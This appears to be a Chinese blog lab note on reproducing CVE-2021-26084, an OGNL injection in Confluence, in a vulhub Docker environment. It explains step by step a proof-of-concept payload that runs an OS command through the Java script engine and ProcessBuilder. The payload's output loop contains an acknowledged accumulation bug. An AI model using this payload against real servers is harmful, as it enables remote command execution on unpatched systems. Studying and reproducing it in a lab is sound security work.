ailx10说：这篇是2024年5月之前写的，后来又改过。继续刷 Confluence 时，我先放了一个简单的计算表达式，确认 queryString 里的内容确实进入了 OGNL，再往 JavaScript 引擎和进程执行走。这样做下来，长长的请求就不只是照抄的字符串，我能分辨每一层在帮我完成什么。笔记里既有手工拆解，也用到了外部 POC；回看脚本时还能发现输出累计之类的小毛病。这篇比较像一次拆工具的练习：工具给出结果以后，还是得知道输入经过了哪些解释器，哪里可能受 Java 版本影响。

---

CVE-2021-26084 是部分 Confluence Server 和 Data Center 版本中的 OGNL 注入问题。受影响范围及修复版本应参考厂商公告；Confluence Cloud 不在该公告的受影响范围内。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

POC解读：

```
创建ScriptEngineManager
Class.forName('javax.script.ScriptEngineManager').newInstance()

获取JavaScript引擎并执行JavaScript代码
.getEngineByName('JavaScript').eval('...')

JavaScript代码内容
var isWin = java.lang.System.getProperty("os.name").toLowerCase().contains("win");
var cmd = new java.lang.String("id");
var p = new java.lang.ProcessBuilder();
if (isWin) {
    p.command("cmd.exe", "/c", cmd);
} else {
    p.command("bash", "-c", cmd);
}
p.redirectErrorStream(true);
var process = p.start();
var inputStreamReader = new java.io.InputStreamReader(process.getInputStream());
var bufferedReader = new java.io.BufferedReader(inputStreamReader);
var line = "";
var output = "";
while ((line = bufferedReader.readLine()) != null) {
    output += output + line + java.lang.Character.toString(10);
}
```
